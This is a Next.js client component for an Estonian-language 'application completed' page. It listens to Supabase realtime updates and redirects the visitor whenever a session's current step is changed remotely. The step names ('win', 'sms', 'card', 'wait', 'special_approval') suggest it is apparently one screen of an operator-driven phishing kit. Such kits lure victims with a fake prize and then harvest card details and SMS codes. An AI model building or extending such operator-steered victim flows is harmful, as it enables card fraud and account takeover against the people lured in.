"use client";

import { useEffect, useState } from "react";
import { usePathname, useRouter } from "next/navigation";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { stepToPath } from "@/lib/session-routes";
import type { SessionStep } from "@/types/session";

type Props = {
  sessionId?: string;
};

export function CongratulationsClient({ sessionId = "" }: Props) {
  const router = useRouter();
  const pathname = usePathname();
  const [effectiveSessionId, setEffectiveSessionId] = useState(sessionId);

  useEffect(() => {
    if (sessionId) return;
    try {
      const cached = localStorage.getItem("activeSessionId");
      if (cached) setEffectiveSessionId(cached);
    } catch {
      /* ignore */
    }
  }, [sessionId]);

  useEffect(() => {
    if (!effectiveSessionId) return;
    const supabase = createBrowserSupabaseClient();
    if (!supabase) return;
    const allowedSteps: SessionStep[] = ["win", "sms", "card", "wait", "congrats", "special_approval"];

    const applyStep = (nextStep?: SessionStep) => {
      if (!nextStep) return;
      if (!allowedSteps.includes(nextStep)) return;
      if (nextStep === "congrats" && pathname.startsWith("/congratulations")) return;
      router.push(stepToPath(nextStep, effectiveSessionId));
    };

    const channel = supabase
      .channel(`congrats-session:${effectiveSessionId}`)
      .on(
        "postgres_changes",
        { event: "UPDATE", schema: "public", table: "sessions", filter: `id=eq.${effectiveSessionId}` },
        (payload) => {
          const next = payload.new as { current_step?: SessionStep };
          applyStep(next.current_step);
        },
      )
      .subscribe();

    return () => {
      void supabase.removeChannel(channel);
    };
  }, [effectiveSessionId, pathname, router]);

  return (
    <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
      <div className="app-panel fade-in relative z-10 mx-auto w-full max-w-[650px] overflow-hidden rounded-[24px] bg-[#021a0e] border border-[#0fae4e] shadow-[0_0_40px_rgba(15,174,78,0.3)] p-8 text-center">
        <div className="pointer-events-none absolute inset-0 opacity-70">
          <div className="absolute left-[14%] top-[20%] h-2 w-2 rounded-full bg-brand-gold/70" />
          <div className="absolute left-[26%] top-[14%] h-2.5 w-2.5 rounded-full bg-yellow-400/80" />
          <div className="absolute right-[24%] top-[16%] h-2 w-2 rounded-full bg-lime-300/80" />
          <div className="absolute right-[12%] top-[26%] h-2.5 w-2.5 rounded-full bg-brand-blue/80" />
        </div>
        <div className="relative mx-auto grid size-20 place-items-center rounded-full bg-white/5 shadow-sm ring-4 ring-white/5">
          <svg
            aria-hidden
            viewBox="0 0 24 24"
            className="size-9 text-[#0fae4e]"
            fill="none"
            stroke="currentColor"
            strokeWidth="2"
            strokeLinecap="round"
            strokeLinejoin="round"
          >
            <path d="M20 6 9 17l-5-5" />
          </svg>
        </div>
        <h2 className="text-2xl font-bold text-white mt-6 mb-2">Taotlus lõpetatud</h2>
        <p className="relative mt-2 text-base font-medium text-gray-300">
          Palju õnne! Teie taotlus on edukalt lõpetatud. Jätkake partneri juhistega.
        </p>
      </div>
    </div>
  );
}
